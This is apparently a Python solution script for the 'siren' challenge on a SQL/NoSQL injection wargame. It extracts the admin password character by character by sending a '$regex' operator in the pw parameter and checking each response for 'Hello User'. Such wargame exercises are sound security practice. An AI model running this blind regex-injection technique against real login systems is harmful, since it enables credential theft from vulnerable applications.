# lordofsqli: siren
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php'
cookies = {'PHPSESSID': 'vboarv46gs86k84bu0sj74svqe'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'id': 'admin', 'pw[$regex]': f'^{passwd + c}'}
        r = requests.get(url, payload, cookies=cookies)
    
        if 'Hello User' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)
